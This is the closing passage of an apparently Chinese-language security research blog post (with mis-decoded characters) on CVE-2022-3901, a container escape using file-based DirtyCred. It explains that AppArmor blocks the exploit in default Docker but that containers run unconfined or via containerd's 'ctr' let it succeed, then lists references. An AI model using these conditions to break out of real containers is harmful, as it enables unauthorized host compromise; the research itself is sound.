href="https://elixir.bootlin.com/linux/v6.0-rc5/source/security/apparmor/file.c#L598"><code>aa_file_perm()</code></a>å¤±è´¥ï¼Œå¯¼è‡´<code>aio_write()</code>è¿”å›è€Œæœªå®é™…æ‰§è¡Œå†™å…¥æ“ä½œã€‚ğŸ˜¥</p><h3 id="docker-with-apparmorunconfined">Docker with <code>apparmor=unconfined</code></h3><p>Commandï¼š<code>sudo docker run -it --rm --security-opt apparmor=unconfined ubuntu bash</code></p><p>ç„¶è€Œï¼Œå¦‚æœ Docker å®¹å™¨ä½¿ç”¨<code>apparmor=unconfined</code>è¿è¡Œï¼Œé‚£ä¹ˆ<code>aa_file_perm()</code>ä¼šåœ¨å®é™…æƒé™æ£€æŸ¥å‘ç”Ÿä¹‹å‰æå‰é€€å‡ºï¼Œä»è€Œä½¿æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨èƒ½å¤Ÿé¡ºåˆ©è¿›è¡Œã€‚</p><p>è¿™ç§æƒ…å†µå¹¶ä¸æ˜¯éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºä¸å¤ªå¯èƒ½æœ‰äººä¼šç‰¹æ„åœ¨å·²éƒ¨ç½²çš„ Docker å®¹å™¨ä¸Šç¦ç”¨ AppArmorã€‚</p><h2 id="æ›´å®é™…çš„åœºæ™¯">æ›´å®é™…çš„åœºæ™¯</h2><p>Commandï¼š<code>sudo ctr run -t --rm docker.io/library/ubuntu:latest bash</code></p><p>å¦‚æœæˆ‘ä»¬ä½¿ç”¨ç›´æ¥åœ¨ containerd çš„ API ä¹‹ä¸Šè¿è¡Œçš„<code>ctr</code>å‘½ä»¤è¡Œå®¢æˆ·ç«¯æ¥å¯åŠ¨å®¹å™¨ï¼Œé‚£ä¹ˆè¯¥æ¼æ´åˆ©ç”¨ç¨‹åºä¹Ÿå¯ä»¥æ­£å¸¸å·¥ä½œã€‚è¿™æ˜¯è¯¥æŠ€æœ¯çš„ä¸€ä¸ªæ›´ç°å®çš„åˆ©ç”¨ã€‚ğŸ™‚</p><h1 id="references">References</h1><ul><li>io_uring<ul><li><a target="_blank" rel="noopener" href="https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf">https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf</a></li><li><a target="_blank" rel="noopener" href="https://lwn.net/Articles/863071/">https://lwn.net/Articles/863071/</a></li><li><a target="_blank" rel="noopener" href="https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages">https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages</a></li></ul></li><li>DirtyCred<ul><li><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf">https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf</a></li><li><a target="_blank" rel="noopener" href="https://blog.hacktivesecurity.com/index.php/2022/12/21/cve-2022-2602-dirtycred-file-exploitation-applied-on-an-io_uring-uaf/">https://blog.hacktivesecurity.com/index.php/2022/12/21/cve-2022-2602-dirtycred-file-exploitation-applied-on-an-io_uring-uaf/</a></li><li><a target="_blank" rel="noopener" href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique">https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique</a></li></ul></li><li><code>/proc</code> filesystem<ul><li><a target="_blank" rel="noopener" href="https://docs.kernel.org/filesystems/proc.html">https://docs.kernel.org/filesystems/proc.html</a></li></ul></li><li>Kernel AIO<ul><li><a target="_blank" rel="noopener" href="https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/">https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/</a></li></ul></li><li>fallocate() slow page<ul><li><a target="_blank" rel="noopener" href="https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8">https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8</a></li></ul></li></ul></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/Security-Research/" class="category-chain-item">Security Research</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/System-Security/" class="print-no-link">#System Security</a> <a href="/tags/DirtyCred/" class="print-no-link">#DirtyCred</a> <a href="/tags/linux/" class="print-no-link">#linux</a> <a href="/tags/Kernel/" class="print-no-link">#Kernel</a> <a href="/tags/CVE/" class="print-no-link">#CVE</a> <a href="/tags/Container-Escape/" class="print-no-link">#Container Escape</a></div></div><div class="license-box my-3"><div class="license-title"><div>CVE-2022-3901ï¼šåˆ©ç”¨DirtyCredè¿›è¡Œå®¹å™¨é€ƒé€¸</div><div>https://mundi-xu.github.io/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/</div></div><div class="license-meta"><div class="license-meta-item"><div>Author</div><div>ç…Šå®‡</div></div><div class="license-meta-item license-meta-date"><div>Posted on</div><div>August 3, 2023</div></div><div class="license-meta-item"><div>Licensed under</div><div><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/" rel="external nofollow noreferrer"><span class="hint--top hint--rounded" aria-label="BY - Attribution"><i class="iconfont icon-cc-by"></i> </span></a><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/" rel="external nofollow noreferrer"><span class="hint--top hint--rounded" aria-label="NC - Non-commercial"><i class="iconfont icon-cc-nc"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/2024/03/25/IELTS/" title="é›…æ€å­¦ä¹ ç¬”è®°"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">é›…æ€å­¦ä¹ ç¬”è®°</span> <span class="visible-mobile">Previous</span></a></article><article class="post-next col-6"><a href="/2023/07/26/Security-Risk-Analysis-of-Huawei-Mindspore/" title="MindSporeé£é™©å‰–æä¸æµ‹è¯•æŒ‡å—"><span class="hidden-mobile">MindSporeé£é™©å‰–æä¸æµ‹è¯•æŒ‡å—</span> <span class="visible-mobile">Next</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments"><div id="giscus" class="giscus"></div><script type="text/javascript">Fluid.utils.loadComments('#giscus', function() {
        var options = {"repo":"Mundi-Xu/mundi-xu.github.io","repo-id":"MDEwOlJlcG9zaXRvcnkxNTQ1OTg4Mjg=","category":"Announcements","category-id":"DIC_kwDOCTb9rM4CeUGi","theme-light":"light","theme-dark":"dark","mapping":"title","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN","strict":0};
        var attributes = {};
        for (let option in options) {
          if (!option.startsWith('theme-')) {
            var key = option.startsWith('data-') ? option : 'data-' + option;
            attributes[key] = options[option];
          }
        }
        var light = 'light';
        var dark = 'dark';
        window.GiscusThemeLight = light;
        window.GiscusThemeDark = dark;
        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
        for (let attribute in attributes) {
          var value = attributes[attribute];
          if (value === undefined || value === null || value === '') {
            delete attributes[attribute];
          }
        }
        var s = document.createElement('script');
        s.setAttribute('src', 'https://giscus.app/client.js');
        s.setAttribute('crossorigin', 'anonymous');
        for (let attribute in attributes) {
          s.setAttribute(attribute, attributes[attribute]);
        }
        var ss = document.getElementsByTagName('script');
        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
        e.parentNode.insertBefore(s, e.nextSibling);
      });</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>Table of Contents</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">Search</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">Keyword</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="mailto:mundi.xu@gmail.com?subject=Interested+In+Your+Blog" rel="external nofollow noreferrer" target="_blank"><span>Contact me</span></a> <i class="iconfont icon-love"></i> <a href="mailto:mundi.xu@gmail.com?subject=Interested+In+Your+Blog" rel="external nofollow noreferrer" target="_blank"><span>mundi.xu@gmail.com</span></a></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">Views: <span id="busuanzi_value_site_pv"></span> </span><span id="busuanzi_container_site_uv" style="display:none">Visitors: <span id="busuanzi_value_site_uv"></span></span></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",function(){NProgress.done()})</script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.1.0/typed.umd.js"></script><script>!function(t){var e=Fluid.plugins.typing,i=t.getElementById("subtitle");i&&e&&e(i.getAttribute("data-typed-text"))}((window,document))</script><script src="/js/img-lazyload.js"></script><script>var relativeDate=function(){var t,e,a,d,i=document.getElementById("updated-time");i&&(e=/\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/,(a=(t=i.textContent).match(e))&&(d=dayjs(a[0]).fromNow(),i.textContent=t.replace(e,d)),i.style.display="")};Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.13/dayjs.min.js",function(){Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.13/plugin/relativeTime.min.js",function(){dayjs.extend(dayjs_plugin_relativeTime),"en".startsWith("en")?relativeDate():Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.13/locale/en.min.js",function(){dayjs.locale("en"),relativeDate()})})})</script><script>Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.js",function(){var t,o=jQuery("#toc");0!==o.length&&window.tocbot&&(t=jQuery("#board-ctn").offset().top,window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-t},CONFIG.toc)),0<o.find(".toc-list-item").length&&o.css("visibility","visible"),Fluid.events.registerRefreshCallback(function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;0<t.find(".toc-list-item").length&&t.css("visibility","visible")}}))})</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript('https://cdnjs.cloudflare.com/ajax/libs/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });</script><script>Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js",function(){Fluid.plugins.fancyBox()})</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/DynamicLine.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">Blog works best with JavaScript enabled</div></noscript></body></html>